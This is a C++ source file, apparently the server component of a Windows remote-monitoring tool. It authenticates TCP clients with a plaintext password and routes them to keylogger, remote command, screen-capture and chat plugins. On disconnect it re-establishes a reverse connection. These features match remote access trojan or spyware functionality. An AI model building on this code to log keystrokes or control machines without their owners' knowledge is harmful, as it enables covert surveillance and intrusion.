


DWORD WINAPI ServicerThread(LPVOID PtrToWinMonitorServicer);

class CWinMonitorServicer:public CGeneralMemoryUtility,public CNetworkBasicUtility
{
	protected:
		HANDLE m_ServiceThread;

	protected:
		void Init(void);
		bool ValidClient(TCHAR *PassWord);
		bool Authenticate(void);
		BYTE GetClientType(void);
		
	public: 
		CWinMonitorServicer(void);
	   ~CWinMonitorServicer();
	    bool ResetServiceThread(void);
		bool IsServicing(void);
		bool ServiceClient(CTcpNwMonitorConnection &TcpConnection,bool IsNotifyClient=true,bool IsAuthenticate=true,bool NotifyTo=true);
		bool StopService(void);
		void DeleteArray(void** Array) { DeleteAll(Array); return; } 

};

bool CWinMonitorServicer::ResetServiceThread(void) 
{ 
	WaitForMux(); 
		m_ServiceThread=0;
	GiveUpMux();
	return true;
}

bool CWinMonitorServicer::IsServicing(void)
{
	WaitForMux(); 
		bool boolYes=m_ServiceThread?true:false;
	GiveUpMux();
	return boolYes;
}


bool CWinMonitorServicer::ValidClient(TCHAR *PassWord)
{
	try
	{
		if(_tcscmp(PassWord,gbl_struct_WinMonitorServerConfig.SNetworkConnection.tchrPassword))
			return false;
		else return true;
	}
	catch(...) { return false; }
}

CWinMonitorServicer::~CWinMonitorServicer()
{
	try
	{
		Init();
	}
	catch(...){}
}

CWinMonitorServicer::CWinMonitorServicer(void):CGeneralMemoryUtility(),CNetworkBasicUtility()
{
	m_ServiceThread=0;
}

void CWinMonitorServicer::Init(void)
{
	if(m_ServiceThread)
	{
		try
		{
			DWORD ExitStatus;
			if(GetExitCodeThread(m_ServiceThread,(LPDWORD)&ExitStatus))
				if(ExitStatus==STILL_ACTIVE) TerminateThread(m_ServiceThread,0); 
		}
		catch(...) {}
		SendShutDownMessage();
		CreateNetworkMutex(); 
		m_ServiceThread=0;
	}
	return;
}

bool CWinMonitorServicer::StopService(void)
{
	Init(); 
	return true;
}


bool CWinMonitorServicer::Authenticate(void)
{
	try
	{
		WinMonitorNetworkServiceHeader Header;
		UINT32 uint32BytesSend, uint32BytesReceived;
		Header.m_uint32Length=0;Header.m_bytMsgType=WIN_MONITOR_GET_PWD;  
		while(!m_TcpConnection.SendByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesSend)); 
		while(!m_TcpConnection.ReceiveByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesReceived)); 
		if(Header.m_bytMsgType!=WIN_MONITOR_GOT_PWD) return false;
		TCHAR *PassWord=0;
		AllocateMem((void**)&PassWord,sizeof(TCHAR)*(Header.m_uint32Length+1)); 
		while(!m_TcpConnection.ReceiveByteStream((char*)PassWord,sizeof(TCHAR)*Header.m_uint32Length,uint32BytesReceived));
		PassWord[Header.m_uint32Length]=_T('\0');
		bool boolValidClient=ValidClient(PassWord);
		DeleteAll((void**)&PassWord); 
		if(boolValidClient) 
			try
			{
				Header.m_uint32Length=0;Header.m_bytMsgType=WIN_MONITOR_PWD_OK;  
				while(!m_TcpConnection.SendByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesSend)); 
				return true;
			}
			catch(...) {}
	}
	catch(...) {}
	return false;
}

BYTE CWinMonitorServicer::GetClientType(void)
{
	WinMonitorNetworkServiceHeader Header;
	UINT32 uint32BytesSend, uint32BytesReceived;
	Header.m_uint32Length=0;Header.m_bytMsgType=WIN_MONITOR_GET_CLIENTTYPE;  
	while(!m_TcpConnection.SendByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesSend)); 
	while(!m_TcpConnection.ReceiveByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesReceived)); 
	BYTE BytClientType=Header.m_bytMsgType;
	Header.m_uint32Length=0;Header.m_bytMsgType=WIN_MONITOR_CLIENT_ACCEPTED; 
	while(!m_TcpConnection.SendByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesSend)); 
	return BytClientType;
}

bool CWinMonitorServicer::ServiceClient(CTcpNwMonitorConnection &TcpConnection,bool IsNotifyClient,bool IsAuthenticate,bool NotifyTo)
{
	StopService();
	m_TcpConnection=TcpConnection;
	if(IsNotifyClient)
	{
		WinMonitorNetworkServiceHeader Header;
		UINT32 uint32BytesSendRecvd;
		if(NotifyTo)
		{
			Header.m_uint32Length=0;Header.m_bytMsgType=WIN_MONITOR_KEEP_ALIVE;  
			while(!m_TcpConnection.SendByteStream((char*)&Header,sizeof(WinMonitorNetworkServiceHeader),uint32BytesSendRecvd));
		}
		else
		{
			while(!m_TcpConnection.ReceiveByteStream((char*)&Header,sizeof(WinMonitorNetworkServiceHeader),uint32BytesSendRecvd));
			if(Header.m_bytMsgType!=WIN_MONITOR_KEEP_ALIVE) return false;
		}
		if(!Authenticate()) { SendShutDownMessage(); return false; }
	}
	else if(IsAuthenticate) if(!Authenticate()) { SendShutDownMessage(); return false; }

	BYTE bytType=GetClientType();
	if(bytType==WIN_MONITOR_CHAT_CLIENTSERVER)
	{
		CChatServerPlugin *newChatServer=new CChatServerPlugin();
		if(newChatServer->IsValid()) 
			if(newChatServer->ServiceChatClient(m_TcpConnection)) 
			{
				m_TcpConnection.Invalidate();  
				return false;
			}
		SendShutDownMessage(); 
		delete newChatServer;
		return false;
	}
	else if(bytType==WIN_MONITOR_KEYLOG_CLIENTSERVER)
	{
		if(COnlineKeyLoggerPlugin::AddKeyLoggerClient(m_TcpConnection))
		{
			m_TcpConnection.Invalidate();  
			return false;
		}
		SendShutDownMessage(); 
		return false;
	}

	try
	{
		m_ServiceThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&ServicerThread,(LPVOID)this,CREATE_SUSPENDED,NULL);
		if(!m_ServiceThread) return false;
		ResumeThread(m_ServiceThread);
		return true;
	}
	catch(...) { return false; }
}


DWORD WINAPI ServicerThread(LPVOID PtrToCWinMonitorServicer)
{
	CWinMonitorServicer *WinMonitorServicerPtr=(CWinMonitorServicer*)PtrToCWinMonitorServicer;
	CTcpNwMonitorConnection ClientConnection=WinMonitorServicerPtr->GetConnection(); 
	WinMonitorNetworkServiceHeader Header;
	UINT32 uint32BytesSend, uint32BytesReceived;

	BYTE *bytDataStream=0;
	INetworkByteStream   *NetworkInterface;
	CCommandMonitorServer CommandServer;
	CDesktopPlugin ScreenServer;
	
	if(ScreenServer.IsValid()) ScreenServer.SetCompression(SCREEN_MONITOR_COMPRESS_LZSS);    

	CommandServer.SetCompression(COMMAND_MONITOR_COMPRESS_LZSS);

	bool blnContinueService=true;
	bool blnSockError;
	try
	{
		while(blnContinueService)
		{
			while(ClientConnection.IsEmptyReceiveBuffer(blnSockError))
				if(!blnSockError) Sleep(100);
				else break;
			
			WinMonitorServicerPtr->WaitForMux(); 
			
			
			if(!ClientConnection.ReceiveByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesReceived))
				Header.m_uint32Length=0,Header.m_bytMsgType=WIN_MONITOR_SHUTDOWN_CONNECTION;

			
			if(Header.m_uint32Length)
			{
				while(!WinMonitorServicerPtr->AllocateMem((void**)&bytDataStream,sizeof(BYTE)*Header.m_uint32Length));
				if(!ClientConnection.ReceiveByteStream((char*)bytDataStream,Header.m_uint32Length,uint32BytesReceived))
					Header.m_uint32Length=0,Header.m_bytMsgType=WIN_MONITOR_SHUTDOWN_CONNECTION; 
			}

			switch(Header.m_bytMsgType)
			{
				case WIN_MONITOR_COMMAND_MONITOR:
					NetworkInterface=&CommandServer; break;

				case WIN_MONITOR_SCREEN_MONITOR:
					if(ScreenServer.IsValid()) NetworkInterface=&ScreenServer; 
					else                       NetworkInterface=0;
					break;

				case WIN_MONITOR_SHUTDOWN_CONNECTION:   
						blnContinueService=false;
						continue;
						
				case WIN_MONITOR_NULL_COMMAND:NetworkInterface=0;break;  
				default:
					NetworkInterface=0;
					ClientConnection.FlushAll(); 
					break;
			}
			if(NetworkInterface)
				if(NetworkInterface->ReadFromNetworkByteStream(bytDataStream)!=Header.m_uint32Length) 
					WinMonitorServicerPtr->SendNullCommand();
				else 
				{	
					Header.m_uint32Length=NetworkInterface->WriteToNetworkByteStream(bytDataStream);
					*((WinMonitorNetworkServiceHeader*)bytDataStream)=Header;
					ClientConnection.SendByteStream((char*)bytDataStream,sizeof(WinMonitorNetworkServiceHeader)+Header.m_uint32Length,uint32BytesSend);  
				}
			WinMonitorServicerPtr->GiveUpMux(); 
			WinMonitorServicerPtr->DeleteArray((void**)&bytDataStream); 
			Sleep(10);
		}
	}
	catch(...) {}

	WinMonitorServicerPtr->GiveUpMux(); 
	WinMonitorServicerPtr->ResetServiceThread(); 
	ClientConnection.Disconnect();
	gbl_lnkdlst_TcpClients.DeleteItemByAddress((UINT64)WinMonitorServicerPtr);
	if(gbl_ReverseClient==(void*)WinMonitorServicerPtr) InstallReverseConnection();
	delete WinMonitorServicerPtr;

	return 0;
}
                
